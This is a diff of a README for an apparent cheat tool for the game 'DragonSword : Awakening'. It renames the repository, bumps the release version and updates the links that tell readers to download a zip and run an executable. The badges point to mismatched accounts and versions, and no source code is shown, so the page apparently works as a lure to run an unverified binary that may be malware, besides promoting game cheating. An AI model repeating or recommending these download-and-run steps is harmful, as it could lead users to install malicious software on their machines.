@@ -1,10 +1,10 @@
-# DragonSword : Awakening Hacks / Cheat (17-Aug-26)
+# DragonSword : Awakening Cheats / Hack (19-Aug-26)
 
 
-[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack/releases/download/v1/DSAW-V1.zip)
-[![GitHub release](https://img.shields.io/badge/Release-1.1-blue?style=for-the-badge)](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack/releases/download/v1/DSAW-V1.zip)
+[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/RaikageDisplay/DragonSword-Awakening-Cheat/releases/download/v1.2/DSAW-V1.zip)
+[![GitHub release](https://img.shields.io/badge/Release-v1-blue?style=for-the-badge)](https://github.com/RaikageDisplay/DragonSword-Awakening-Cheat/releases/download/v1.2/DSAW-V1.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Stars](https://img.shields.io/github/stars/Crushflalead/DragonSword-Awakening-Trainer?style=for-the-badge&logo=github)](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack/stargazers)
+[![Stars](https://img.shields.io/github/stars/Crushflalead/DragonSword-Awakening-Trainer?style=for-the-badge&logo=github)](https://github.com/RaikageDisplay/DragonSword-Awakening-Cheat/stargazers)
 
 
 _A feature-rich in-game cheat menu for DragonSword : Awakening with a clean overlay UI_
@@ -67,16 +67,16 @@ Check the Features list below.
 ---
 
 ## How to Install
-1. Download the [latest release build](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack/releases/download/v1/DSAW-V1.zip) from repo's Releases page.
+1. Download the [latest release build](https://github.com/RaikageDisplay/DragonSword-Awakening-Cheat/releases/download/v1.2/DSAW-V1.zip) from repo's Releases page.
 2. Extract the contents to any folder (e.g., `C:\DragonSwordtoolssss`).
 3. Launch game.
-4. Run `DS-Awakening-Hack_github-1.1.exe`.
+4. Run `DS-Awakening-Hack_github-1.2.exe`.
 5. Enjoy. Press the toggle hotkey (default: `[Insert]`) to open the menu.
 
 ---
 
 ## Screenshots
-![Mod Menu Preview](https://github.com/RaikageDisplay/DragonSword-Awakening-Hack/blob/main/assets/image.png)
+![Mod Menu Preview](https://github.com/RaikageDisplay/DragonSword-Awakening-Cheat/blob/main/assets/image.png)
 
 
 ---
